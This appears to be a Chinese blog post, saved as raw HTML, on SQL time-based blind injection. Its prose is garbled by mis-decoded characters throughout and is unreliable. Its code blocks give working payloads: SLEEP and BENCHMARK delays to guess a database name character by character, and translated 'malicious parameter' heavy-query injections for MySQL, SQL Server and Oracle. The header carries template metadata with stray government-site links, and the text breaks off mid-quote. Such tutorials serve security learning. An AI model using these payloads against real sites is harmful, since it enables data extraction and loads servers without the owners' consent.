<!-- Post layout -->
<!DOCTYPE html>
<html>
<head>
<!-- Introducing the head tag -->

<!-- Begin Jekyll SEO tag v2.6.1 -->
<title>SQLæ³¨å…¥-æ—¶é—´ç›²æ³¨æ•´ç† | sueisok</title>
<meta name="generator" content="Jekyll v3.8.6" />
<meta property="og:title" content="SQLæ³¨å…¥-æ—¶é—´ç›²æ³¨æ•´ç†" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Notes,Thoughts and Else" />
<meta property="og:description" content="Notes,Thoughts and Else" />
<link rel="canonical" href="http://localhost:4000/blog/sqli-time-based/" />
<meta property="og:url" content="http://localhost:4000/blog/sqli-time-based/" />
<meta property="og:site_name" content="sueisok" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2020-04-16T11:26:08+08:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="SQLæ³¨å…¥-æ—¶é—´ç›²æ³¨æ•´ç†" />
<meta name="twitter:site" content="@your_name" />
<meta name="google-site-verification" content="XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX" />
<script type="application/ld+json">
{"@type":"BlogPosting","headline":"SQLæ³¨å…¥-æ—¶é—´ç›²æ³¨æ•´ç†","dateModified":"2020-04-16T11:26:08+08:00","datePublished":"2020-04-16T11:26:08+08:00","url":"http://localhost:4000/blog/sqli-time-based/","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/blog/sqli-time-based/"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/banner.png"}},"description":"Notes,Thoughts and Else","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->

<script type="application/ld+json">
    {
      "@context": "http://schema.org/",
      "@type": "Person",
      "image": /assets/JHON.jpg,
      "honorificPrefix": "MD.",
      "name": sueisok,
      "familyName": Your family name,
      "honorificSuffix": King,
      "disambiguatingDescription": Your awesome description,
      "birthPlace": Your address,
      "birthDate": Your Date of Birth,
      "height": XX inches,
      "gender": Your gender,
      "memberOf": Your awesome orgranization,
      "nationality": Your proud nationality,
      "jobTitle": Your Respectful Position,
      "knowsAbout": Your awesome Skill,
      "knowsLanguage": ,
      "email": ,
      "url": " http://localhost:4000 ",
      "test": 
      "worksFor": {
        "@type": ,
        "name": ,
        "openingHours": ,
        "priceRange": ,
        "telephone": ,
        "image": ,
        "address": {
        "@type": ,
        "addressCountry": ,
        "addressLocality": ,
        "addressRegion": 
         }
      },
      "address": {
        "@type": ,
        "addressCountry": ,
        "addressLocality": ,
        "addressRegion": 
      },
      "colleague": [
        "https://deb108471.dhakaeducationboard.gov.bd",
        "https://deb113652.dhakaeducationboard.gov.bd",
        "https://deb110880.dhakaeducationboard.gov.bd"
      ]
    }
</script>

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-sclable=0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="description" content="Notes,Thoughts and Else" />
<meta name="keywords" content="123456" />

<!-- preloader -->
<link rel="stylesheet" href="http://localhost:4000/assets/css/preloader.css">

<!-- Favicon -->
<link href="/assets/icon.png" rel="shortcut icon" />
<link href="/assets/icon.png" rel="apple-touch-icon-precomposed" />
<!-- Android Lolipop Theme Color -->
<!-- <meta name="theme-color" content="#1464FB"> -->
<title>SQLæ³¨å…¥-æ—¶é—´ç›²æ³¨æ•´ç†</title>
<!-- Baidu statistics -->

<!-- Google Analytics -->

<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id="></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', '');
</script>


<!-- Android Lolipop Theme Color -->
<meta name="theme-color" content=" rgb(122,103,138) ">
</head>
<body onload="loaderFunc()" data-spy="scroll" data-target="#toc" data-offset="20">


<!-- preloader -->
<div id="loader" class="loader">
  <div class="artboard">
    <div class="square"></div>
    <div class="path">
      <div class="small-squares">
        <div></div>
        <div></div>
        <div></div>
        <div></div>
        <div></div>
        <div></div>
      </div>
    </div>
  </div>
</div>
<!-- end -->

<!-- Top anchor -->
<a id="htmlup" name="htmlup"></a>
<!-- Introduce blog post options -->

<header id="post-header" style="background-color:rgb(122,103,138);">
  <div class="top-center">
      <div class="logo">
          <a href="/" title="my awesome webtitle" style="color: white;">sueisok</a>
      </div>
      <nav class="top-nav">
          <ul>
              
                <li><a href="/" style="color: white;">Home</a></li>
              
                <li><a href="/tags/" style="color: white;">Tags</a></li>
              
                <li><a href="/timeline/" style="color: white;">Timeline</a></li>
              
                <li><a href="/about/" style="color: white;">About</a></li>
              
                <li><a href="/reLink/" style="color: white;">reLink</a></li>
              
          </ul>
      </nav>
      <div id="top-boot">
        <a href="javascript:;" id="boot1" style="display:block;" onclick="document.getElementById('boot-area').style.display='block';document.getElementById('boot1').style.display='none';document.getElementById('boot2').style.display='block';"><img src="/assets/boot_white.png" alt=""></a>
        <a href="javascript:;" id="boot2" style="display: none;" onclick="document.getElementById('boot-area').style.display='none';document.getElementById('boot1').style.display='block';document.getElementById('boot2').style.display='none';"><img src="/assets/boot_white.png" alt=""></a>
      </div>
  </div>

</header>


<!-- Introducing the mobile dropdown option -->
<div id="boot-area">
    <ul>
        
          <a href="/"><li>Home</li></a>
        
          <a href="/tags/"><li>Tags</li></a>
        
          <a href="/timeline/"><li>Timeline</li></a>
        
          <a href="/about/"><li>About</li></a>
        
          <a href="/reLink/"><li>reLink</li></a>
        
    </ul>
</div>

<!-- Introducing the blog post style -->
<!-- Version one garbage -->
<!-- <div class="wow fadeIn top" data-wow-duration="3.5s" >
    <span class="wow fadeInUp" data-wow-delay="0.2s">SQLæ³¨å…¥-æ—¶é—´ç›²æ³¨æ•´ç†</span>
    <span class="wow fadeInUp" data-wow-delay="0.4s"></span>
    <span class="wow fadeInUp" data-wow-delay="0.4s"></span>
    <span class="wow fadeInUp" data-wow-delay="0.6s">Author&nbsp;&nbsp;|&nbsp;&nbsp;true</span>
</div> -->

<!--Version 2 switchable page -->

<div class="post-top" style="background-color:rgb(122,103,138);">
  <!-- Page width is greater than 800px -->
  <div class="left-area">
    
      <a href="/blog/stupid-sqli-blind/" class="btn bounceInLeft animated" onmouseover="showLeft();this.style.color='rgb(122,103,138)';" onmouseout="goneLeft();this.style.color='rgba(0,0,0,.2)';"><</a>
      <div id="left-tab" style="display:none;"><span class="left-san"></span><span class="left-main" style="color:rgb(122,103,138);"><sapn class="main">SQLæ³¨å…¥-å¤±äº†æ™ºçš„ç›²æ³¨å°è¯•</sapn></span></div>
    
  </div>
  <div class="post-titlearea">
    <span class="wow fadeInUp" data-wow-delay="0.2s">SQLæ³¨å…¥-æ—¶é—´ç›²æ³¨æ•´ç†</span>
    <!-- <span class="wow fadeInUp" data-wow-delay="0.4s"></span> -->
    <!-- <span class="wow fadeInUp" data-wow-delay="0.4s"></span> -->
    <!-- <span class="wow fadeInUp" data-wow-delay="0.6s">Author&nbsp;&nbsp;|&nbsp;&nbsp;true</span> -->
  </div>
  <div class="right-area">
    
      <a href="/blog/sqli-trick/" class="btn bounceInRight self-animated" onmouseover="showRight();this.style.color='rgb(122,103,138)';" onmouseout="goneRight();this.style.color='rgba(0,0,0,.2)';">></a>
      <div id="right-tab" style="display:none;"><span class="right-san"></span><span class="right-main" style="color:rgb(122,103,138);"><sapn class="main">SQLæ³¨å…¥-ä¸€äº›å°trick</sapn></span></div>
    
  </div>

  <!-- Page width is less than 800px -->
  <div class="post-changearea">
    
      <a href="/blog/stupid-sqli-blind/" class="leftchange" style="border-right: 1px solid rgb(122,103,138);border-bottom: 2px solid rgb(122,103,138);"><span>Previous<br><br>SQLæ³¨å…¥-å¤±äº†æ™ºçš„ç›²æ³¨å°è¯•</span></a>
    
    
      <a href="/blog/sqli-trick/" class="rightchange" style="border-left: 1px solid rgb(122,103,138);border-bottom: 2px solid rgb(122,103,138);"><span>Next<br><br>SQLæ³¨å…¥-ä¸€äº›å°trick</span></a>
    
  </div>
</div>


<div class="markdown-body fadeInUp animated">
  

    
      <div class="postpage-subtitle" style="border-left: 8px solid rgb(122,103,138); border-right: 8px solid rgb(122,103,138)">
        Time Based
      </div>
    
  

  <!-- Article content -->
 <ul id="markdown-toc">
  <li><a href="#ä¸€äº›çŒœæ•°æ®åº“æ—¶ç”¨åˆ°çš„å‡½æ•°" id="markdown-toc-ä¸€äº›çŒœæ•°æ®åº“æ—¶ç”¨åˆ°çš„å‡½æ•°">ä¸€äº›çŒœæ•°æ®åº“æ—¶ç”¨åˆ°çš„å‡½æ•°</a></li>
  <li><a href="#sleep" id="markdown-toc-sleep">SLEEP</a></li>
  <li><a href="#benchmark" id="markdown-toc-benchmark">BENCHMARK</a></li>
  <li><a href="#heavy-query" id="markdown-toc-heavy-query">Heavy Query</a>    <ul>
      <li><a href="#principle" id="markdown-toc-principle">Principle</a></li>
      <li><a href="#mysql-or-sql-server" id="markdown-toc-mysql-or-sql-server">MySQL or SQL Server</a></li>
      <li><a href="#oracle" id="markdown-toc-oracle">Oracle</a></li>
      <li><a href="#additionnal-information" id="markdown-toc-additionnal-information">Additionnal Information</a></li>
    </ul>
  </li>
  <li><a href="#get_lock" id="markdown-toc-get_lock">GET_LOCK</a></li>
  <li><a href="#æ­£åˆ™è¡¨è¾¾å¼" id="markdown-toc-æ­£åˆ™è¡¨è¾¾å¼">æ­£åˆ™è¡¨è¾¾å¼</a></li>
  <li><a href="#insert-å’Œ-update-çš„ç›²æ³¨" id="markdown-toc-insert-å’Œ-update-çš„ç›²æ³¨">insert å’Œ update çš„ç›²æ³¨</a></li>
  <li><a href="#refer" id="markdown-toc-refer">Refer</a></li>
</ul>

<p>ç›²æ³¨ï¼Œç»æˆ‘ç†è§£å°±æ˜¯åœ¨æœåŠ¡ç«¯ä¸å¯ä»¥ç›´æ¥è¿”å›æ•°æ®çš„æ—¶å€™ï¼Œæ‘¸ç´¢å¯ä»¥åŒºåˆ«æœåŠ¡å™¨æ‰§è¡Œç»“æœçš„æ–¹æ³•ã€‚</p>

<h1 id="ä¸€äº›çŒœæ•°æ®åº“æ—¶ç”¨åˆ°çš„å‡½æ•°">ä¸€äº›çŒœæ•°æ®åº“æ—¶ç”¨åˆ°çš„å‡½æ•°</h1>

<p><strong>length(a)</strong></p>

<p>è¿”å›açš„é•¿åº¦</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; select length(database());
+--------------------+
| length(database()) |
+--------------------+
|                  4 |
+--------------------+
1 row in set (0.00 sec)
</code></pre></div></div>

<p><strong>left(a,b)</strong></p>

<p>ä»å·¦ä¾§æˆªå–açš„å‰bä½</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>select left(database(),1);
+--------------------+
| left(database(),1) |
+--------------------+
| t                  |
+--------------------+
1 row in set (0.00 sec)
</code></pre></div></div>

<p><strong>substr(a,b,c)</strong></p>

<p>æˆªå–aï¼Œä»bå¼€å§‹ï¼Œé•¿åº¦ä¸ºc</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; select substr(database(),1,2);
+------------------------+
| substr(database(),1,2) |
+------------------------+
| te                     |
+------------------------+
1 row in set (0.00 sec)
</code></pre></div></div>

<p><strong>mid(a,b,c)</strong></p>

<p>å’ŒsubstråŸç†ä¸€æ ·</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; select mid(database(),1,2);
+---------------------+
| mid(database(),1,2) |
+---------------------+
| te                  |
+---------------------+
1 row in set (0.00 sec)
</code></pre></div></div>

<p><strong>ascii(a)</strong></p>

<p>è¾“å‡ºaçš„asciiç å¦‚æœaæ˜¯å­—ç¬¦ä¸²ï¼Œè¾“å‡ºaå­—ç¬¦ä¸²çš„ç¬¬ä¸€ä¸ªå­—ç¬¦çš„asciiç </p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; select ascii(substr(database(),2,3));
+-------------------------------+
| ascii(substr(database(),2,3)) |
+-------------------------------+
|                           101 |
+-------------------------------+
1 row in set (0.00 sec)
</code></pre></div></div>

<p><strong>ord(a)</strong></p>

<p>å’ŒasciiåŸç†ä¸€æ ·</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; select ord('a');
+----------+
| ord('a') |
+----------+
|       97 |
+----------+
1 row in set (0.00 sec)
</code></pre></div></div>

<p><strong><a href="https://sueisok.github.io/blog/sqli-trick/#ifexpr1expr2expr3">if</a></strong></p>

<p><strong><a href="https://sueisok.github.io/blog/sqli-trick/#ifnullexpr1expr2">ifnull</a></strong></p>

<p><strong><a href="https://sueisok.github.io/blog/sqli-trick/#eltnstr1str2">elt</a></strong></p>

<p><strong><a href="https://sueisok.github.io/blog/sqli-trick/#fieldstrstr1str2">field</a></strong></p>

<h1 id="sleep">SLEEP</h1>

<p>sleepå‡½æ•°æ‹¬å·é‡Œçš„å†…å®¹å°±æ˜¯æ—¶é—´</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; select sleep(1);
+----------+
| sleep(1) |
+----------+
|        0 |
+----------+
1 row in set (1.00 sec)
</code></pre></div></div>

<p><strong>åˆ¤æ–­å½“å‰è¡¨è¡Œæ•°</strong></p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; select * from vorname where Vorname = sleep(1);
+---------+------------+-----+
| Vorname | Nachname   | Alt |
+---------+------------+-----+
| Lina    | Schneider  |  22 |
| Lara    | Zhang      |  20 |
| Patric  | Wang       |  23 |
| Tobias  | Alexandria |  22 |
+---------+------------+-----+
4 rows in set, 4 warnings (4.00 sec)
</code></pre></div></div>

<p><strong>åˆ¤æ–­æ•°æ®åº“ä½æ•°</strong></p>

<p>æŠŠsleepæ”¾åˆ°ifé‡Œ</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; select if(length(database())=4,sleep(2),null)a;
+------+
| a    |
+------+
|    0 |
+------+
1 row in set (2.00 sec)
</code></pre></div></div>

<p><strong>é€ä½çŒœè§£æ•°æ®åº“å</strong></p>

<p>æŠŠifæ”¾åˆ°sleepé‡Œ</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; select sleep(if(left(database(),1)='t',1,0))a;
+---+
| a |
+---+
| 0 |
+---+
1 row in set (1.00 sec)
</code></pre></div></div>

<p>è¿˜å¯ä»¥åœ¨sleepé‡Œåšè¿ç®—(payloadæ¥è‡ªsqlmap)ï¼Œ3-1=2ç§’</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; select sleep(3-if(left(database(),1)='t',1,0))a;
+---+
| a |
+---+
| 0 |
+---+
1 row in set (2.00 sec)
</code></pre></div></div>

<p>åŒç†çŒœè§£æ•°æ®è¡¨åï¼ŒçŒœè§£æ•°æ®ç­‰ç­‰</p>

<h1 id="benchmark">BENCHMARK</h1>

<p>benchmarkæ˜¯åŸºå‡†çš„æ„æ€ï¼Œå¯ä»¥ç”±ç”¨æˆ·æŒ‡å®šæ‰§è¡Œä¸€ä¸ªsqlè¯­å¥æˆ–sqlè¡¨è¾¾å¼çš„æ—¶é—´ï¼Œé€šè¿‡æ‰§è¡Œå¤§è§„æ¨¡æ¬¡æ•°ï¼Œè·å¾—æ¯”è¾ƒç¨³å®šçš„sqlæ‰§è¡Œæ—¶é—´</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>BENCHMARK(count,expr)
</code></pre></div></div>

<p><strong>count</strong>æ˜¯æ‰§è¡Œæ¬¡æ•°ï¼Œ<strong>exr</strong>æ˜¯è¦æ‰§è¡Œçš„è¯­å¥æ‰§è¡Œä¸€æ¬¡<strong>sha(1)</strong>æ—¶å¯èƒ½å¾®ä¸è¶³é“ï¼Œæ‰§è¡Œ10000000æ¬¡<strong>sha(1)</strong>çš„æ—¶é—´å°±å¯ä»¥é€ æˆå»¶æ—¶</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; select Alt from vorname where Vorname='Lina' and benchmark(100,sha(1));
Empty set (0.00 sec)

mysql&gt; select Alt from vorname where Vorname='Lina' and benchmark(10000000,sha(1));
Empty set (2.72 sec)
</code></pre></div></div>

<p>å¯ä»¥ç»“åˆ<strong>andçŸ­è·¯è¿ç®—è§„åˆ™</strong>è¿›è¡Œæ—¶é—´ç›²æ³¨</p>

<h1 id="heavy-query">Heavy Query</h1>

<p>æœ‰çš„åœ°æ–¹ä¼šå«<strong>ç¬›å¡å„¿ç§¯</strong>æˆ–è€…<strong>å¤šè¡¨è”åˆæŸ¥è¯¢</strong></p>

<p>å…ˆç¿»è¯‘ä¸€ç¯‡<a href="https://www.sqlinjection.net/heavy-query/">SQLæ³¨å…¥ç½‘ç«™çš„æ–‡ç« </a></p>

<blockquote>
  <p>Using heavy queries instead of time delays</p>
</blockquote>

<p>åˆ©ç”¨å¤§é‡çš„æŸ¥è¯¢ä»£æ›¿æ—¶é—´å»¶è¿Ÿ</p>

<p>ï¼ˆæ¬¸ï¼Œæ„Ÿè§‰benchmarkä¹Ÿæ˜¯è¿™ä¸ªåŸç†ï¼Œåˆ©ç”¨å¤§é‡æ‰§è¡Œä¸€ä¸ªsqlè¯­å¥çš„æ—¶é—´è¿›è¡Œå»¶è¿Ÿ</p>

<blockquote>
  <p>For different reasons, it might happen that it is impossible to use time delay functions or procedures in order to achieve a <a href="https://www.sqlinjection.net/time-based/">classic time delay injection</a>. In these situations, the best option is to simulate it with a <strong>heavy query that will take noticeable time to get executed by the database engine</strong>. This article shows how it can be done and it presents an example for the main DBMS.</p>
</blockquote>

<p>ç”±äºä¸åŒçš„åŸå› ï¼Œæœ‰æ—¶ä¸ä¼šç”¨å»¶æ—¶å‡½æ•°æˆ–ç¨‹åºè¾¾åˆ°ç»å…¸çš„å»¶æ—¶æ³¨å…¥ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæœ€å¥½çš„æ–¹æ³•å°±æ˜¯å°†ä»–ä¸å¤§é‡æŸ¥è¯¢ç»“åˆï¼Œä½¿å¾—æ•°æ®åº“å¼•æ“æ‰§è¡Œæ—¶æ¶ˆè€—ä¸€ä¸ªå¯è§çš„æ—¶é—´ã€‚è¿™ç¯‡æ–‡ç« ä¼šå±•ç¤ºè¿™æ˜¯å¦‚ä½•åšåˆ°çš„ï¼Œå¹¶ä¸¾ä¸€ä¸ªæ•°æ®åº“çš„ä¾‹å­ã€‚</p>

<h2 id="principle">Principle</h2>

<blockquote>
  <p>The injected query should not rely on user tables since in most cases the attacker will have no information about those yet. Queries presented in the following section rely on system tables. The execution time is essentially caused by the large number of lines returned.</p>
</blockquote>

<p>å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…è¿˜æ²¡æœ‰æŒæ¡å…³äºæ•°æ®åº“æˆ–è¡¨çš„ä¿¡æ¯ï¼Œæ‰€ä»¥æŸ¥è¯¢è¯­å¥ä¸åº”è¯¥æ˜¯ä¾èµ–äºæ•°æ®è¡¨çš„ï¼Œä¸‹é¢ä¸¾ä¾‹çš„æŸ¥è¯¢ä¾èµ–äºç³»ç»Ÿæ•°æ®è¡¨ï¼Œæ‰§è¡Œæ—¶é—´äº‹å®ä¸Šæ˜¯å¤§é‡çš„æ‰§è¡Œé€ æˆçš„ã€‚</p>

<blockquote>
  <p>Keep in mind that the time to execute each query presented in this article <strong>can tremendously vary depending on the number of rows</strong> contained or returned by the table (or view). This number can be influenced by many factors like: the permissions of your user, the size of the database, the server performance, etc. You should begin with a query joining 2 tables and slowly increment until you can generate an acceptable delay.</p>
</blockquote>

<p>éœ€è¦äº†è§£çš„æ˜¯ï¼Œè¿™ç¯‡æ–‡ç« ä¸¾ä¾‹çš„æ‰§è¡Œè¯­å¥çš„æ—¶é—´ï¼Œå¯èƒ½åƒå·®ä¸‡åˆ«ï¼Œå–å†³äºè¡Œçš„æ•°é‡æˆ–è€…è¿”å›çš„è¡¨æ ¼ã€‚è¿™ä¸ªæ•°å¯ä»¥è¢«è®¸å¤šæ–¹é¢å½±å“ï¼šç”¨æˆ·çš„æƒé™ã€æ•°æ®åº“çš„å¤§å°ã€æœåŠ¡å™¨çš„æ€§èƒ½ç­‰ç­‰ã€‚ä½ åº”è¯¥ä»¥ä¸¤ä¸ªè¡¨çš„è”åˆè¯­å¥å¼€å§‹ï¼Œæ…¢æ…¢å¢åŠ ç›´åˆ°å¯æ¥å—çš„å»¶æ—¶ã€‚<img src="../../assets/blog_pic/20200416_sqli_time_based/Heavy-Query-Steps.png" alt="avatar" /></p>

<h2 id="mysql-or-sql-server">MySQL or SQL Server</h2>

<blockquote>
  <p>Chances are low that you have to use the heavy query approach in MySQL or SQL Server since these DBMS make it relatively easy to inject classic code delays in a vulnerable field. However, it could still happen if, for example, <strong>some function or characters are blacklisted</strong>. Here is an example of heavy query that would work fine on SQL Server and on MySQL (version 5 or more).</p>
</blockquote>

<p>ä½ ä¸å¾—ä¸ä½¿ç”¨å¤§é‡çš„æŸ¥è¯¢çš„æƒ…å†µè¿˜æ˜¯å¾ˆå°‘çš„ï¼Œå› ä¸ºMySQLæˆ–SQL Severè¿™æ ·çš„æ•°æ®åº“å¾ˆå®¹æ˜“è¢«ç»å…¸çš„å»¶æ—¶æ³¨å…¥ã€‚å½“ç„¶ï¼Œå¦‚æœä¸€äº›å‡½æ•°æˆ–å­—ç¬¦æ˜¯é»‘åå•è¿‡æ»¤çš„ï¼Œè¿™ä¸ªä¾‹å­å°±å¯ä»¥å¾ˆå¥½å¾—åœ¨MySQLå’ŒSQL Severä½¿ç”¨ï¼ˆç‰ˆæœ¬éœ€è¦å¤§äº5ï¼‰</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HEAVY</span> <span class="n">MYSQL</span> <span class="n">QUERY</span><span class="p">.</span>
<span class="k">SELECT</span> <span class="k">count</span><span class="p">(</span><span class="o">*</span><span class="p">)</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="n">A</span><span class="p">,</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="n">B</span><span class="p">,</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="k">C</span>
</code></pre></div></div>

<blockquote>
  <p>In my test environment, the query above returns 594823321 and takes about 10 seconds to execute. Letâ€™s now see how it could be used to identify if a vulnerability is present.</p>
</blockquote>

<p>åœ¨æˆ‘çš„å®éªŒç¯å¢ƒä¸­ï¼Œä»¥ä¸ŠæŸ¥è¯¢è¿”å›ç»“æœä¸º594823321ï¼ŒèŠ±è´¹10ç§’ï¼Œé‚£ä¹ˆæ¥çœ‹ä¸€ä¸‹ä»–æ˜¯æ€ä¹ˆç¡®è®¤æ¼æ´æ˜¯å¦å­˜åœ¨çš„ã€‚</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">MALICIOUS</span> <span class="k">PARAMETER</span><span class="p">.</span>
<span class="mi">1</span> <span class="k">AND</span> <span class="mi">1</span><span class="o">&gt;</span><span class="p">(</span><span class="k">SELECT</span> <span class="k">count</span><span class="p">(</span><span class="o">*</span><span class="p">)</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="n">A</span><span class="p">,</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="n">B</span><span class="p">,</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="k">C</span><span class="p">)</span> 

<span class="n">QUERY</span> <span class="k">GENERATED</span><span class="p">.</span>
<span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">products</span> <span class="k">WHERE</span> <span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="k">AND</span> <span class="mi">1</span><span class="o">&gt;</span><span class="p">(</span><span class="k">SELECT</span> <span class="k">count</span><span class="p">(</span><span class="o">*</span><span class="p">)</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="n">A</span><span class="p">,</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="n">B</span><span class="p">,</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="k">C</span><span class="p">)</span>
</code></pre></div></div>

<blockquote>
  <p>If the server response takes more time, a vulnerability is probably present. Otherwise we can conclude the field is safe.</p>
</blockquote>

<p>å¦‚æœæœåŠ¡å™¨å“åº”èŠ±è´¹äº†å¾ˆå¤šæ—¶é—´ï¼Œé‚£ä¹ˆå¯èƒ½æ˜¯å­˜åœ¨æ¼æ´çš„ï¼Œå¦åˆ™ä½ å¯ä»¥å¾—å‡ºç»“è®ºï¼Œæ­¤å¤„æ˜¯å®‰å…¨çš„ã€‚</p>

<h2 id="oracle">Oracle</h2>

<blockquote>
  <p>As explained in the article about <a href="https://www.sqlinjection.net/time-based/">time-based attacks</a>, in most cases you will need to use heavy queries in order to achieve this kind of SQL injection. Below is an example of query that takes a lot of time to be executed in this DBMS.</p>
</blockquote>

<p>æ­£å¦‚è¿™ç¯‡æ–‡ç« é˜é‡Šçš„ï¼Œå¤§å¤šæ•°æƒ…å†µä¸‹ä½ éœ€è¦ä½¿ç”¨å¤§é‡æŸ¥è¯¢æ¥è¾¾åˆ°å¯¹Oracleæ•°æ®åº“çš„æ³¨å…¥ã€‚ä¸‹é¢å°±æ˜¯ä¸€ä¸ªä¾‹å­ï¼Œåœ¨Oracleä¸­ç”¨å¤§é‡æ—¶é—´æ¥æ‰§è¡ŒæŸ¥è¯¢ã€‚</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HEAVY</span> <span class="n">ORACLE</span> <span class="n">QUERY</span><span class="p">.</span>
<span class="k">SELECT</span> <span class="k">count</span><span class="p">(</span><span class="o">*</span><span class="p">)</span> <span class="k">FROM</span> <span class="n">all_users</span> <span class="n">A</span><span class="p">,</span> <span class="n">all_users</span> <span class="n">B</span><span class="p">,</span> <span class="n">all_users</span> <span class="k">C</span>
</code></pre></div></div>

<blockquote>
  <p>In my Oracle test environment the query above is executed in no time since <strong>I have very few users</strong>. When I grow the FROM clause to 7 tables it takes about 15 seconds. Letâ€™s now see how it could be integrated in a vulnerable field.</p>
</blockquote>

<p>åœ¨æˆ‘çš„Oracleæµ‹è¯•ç¯å¢ƒä¸­ï¼Œä¸Šè¿°çš„æŸ¥è¯¢å¦‚æœåªæœ‰å¾ˆå°‘çš„ç”¨æˆ·æ—¶ï¼Œå‡ ä¹ä¸èŠ±è´¹æ—¶é—´ï¼Œå½“æˆ‘è®²FROMå¢åŠ åˆ°7ä¸ªè¡¨æ—¶å¤§æ¦‚èŠ±è´¹15ç§’ï¼Œé‚£ä¹ˆæ¥çœ‹ä¸€ä¸‹åœ¨å­˜åœ¨æ¼æ´æ—¶ä»–æ˜¯æ€ä¹ˆé›†æˆçš„ã€‚</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">MALICIOUS</span> <span class="k">PARAMETER</span> <span class="p">(</span><span class="nb">TIME</span><span class="o">-</span><span class="n">BASED</span> <span class="n">INJECTION</span><span class="p">).</span>
<span class="mi">1</span> <span class="k">AND</span> <span class="mi">1</span><span class="o">&lt;</span><span class="k">SELECT</span> <span class="k">count</span><span class="p">(</span><span class="o">*</span><span class="p">)</span> <span class="k">FROM</span> <span class="n">all_users</span> <span class="n">A</span><span class="p">,</span> <span class="n">all_users</span> <span class="n">B</span><span class="p">,</span> <span class="n">all_users</span> <span class="k">C</span>

<span class="n">QUERY</span> <span class="k">GENERATED</span><span class="p">.</span>
<span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">products</span> <span class="k">WHERE</span> <span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="k">AND</span> <span class="mi">1</span><span class="o">&lt;</span><span class="k">SELECT</span> <span class="k">count</span><span class="p">(</span><span class="o">*</span><span class="p">)</span> <span class="k">FROM</span> <span class="n">all_users</span> <span class="n">A</span><span class="p">,</span> <span class="n">all_users</span> <span class="n">B</span><span class="p">,</span> <span class="n">all_users</span> <span class="k">C</span>
</code></pre></div></div>

<blockquote>
  <p>Here again, if the test slows significantly the server response, you can conclude a vulnerability is present in the field.</p>
</blockquote>

<p>åŒç†ï¼Œå¦‚æœæµ‹è¯•æœ‰æ˜æ˜¾çš„å“åº”å»¶è¿Ÿï¼Œä½ å°±å¯ä»¥å¾—å‡ºç»“è®ºï¼Œæ­¤å¤„å­˜åœ¨æ¼æ´</p>

<h2 id="additionnal-information">Additionnal Information</h2>

<blockquote>
  <p>As mentioned in the article about time-based attacks, the heavy query approach will have <strong>noticeable impacts on CPU and server resources usage</strong>. Whenever possible, try to inject a time delay that will not be CPU intensive and stick to standards techniques.</p>
</blockquote>

<p>æ­£å¦‚åœ¨å»¶æ—¶æ³¨å…¥æ”»å‡»ä¸­æåˆ°çš„ï¼Œå¤§é‡çš„æŸ¥è¯¢æ–¹å¼ä¼šå¾ˆæ˜¾è‘—åœ°å ç”¨CPUå’ŒæœåŠ¡å™¨èµ„æºï¼Œå¦‚æœå¯èƒ½ï¼Œå°è¯•å»¶æ—¶æ³¨å…¥æ—¶ä¸è¦å¤§é‡å ç”¨CPUæˆ–æŸååŸºç¡€æ¡†æ¶ã€‚</p>

<blockquote>
